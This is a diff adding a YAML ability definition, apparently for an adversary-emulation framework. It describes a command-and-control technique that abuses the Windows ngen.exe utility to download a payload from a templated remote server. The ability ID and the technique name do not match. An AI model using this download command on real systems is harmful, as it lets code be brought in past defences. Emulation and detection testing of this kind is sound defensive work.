@@ -1,0 +1,23 @@
+- id: ba5df1e1-63c4-a2a3-5a76-ed17ffbcc6ec
+  name: Ngen.exe - Downloads payload from remote server using the Microsoft Native
+    Image Generator utility.
+  description: Downloads payload from remote server using the Microsoft Native Image
+    Generator utility.
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: 'ngen.exe #{server}/file/download'
+  singleton: false
+  privilege: User
+  repeatable: true
+  buckets:
+  - command-and-control
+  version: '1.0'
+  author: Avihay Eldad
+  created: '2024-02-19'
+  modified: '2024-02-19'
+  operating_system: Windows All Versions
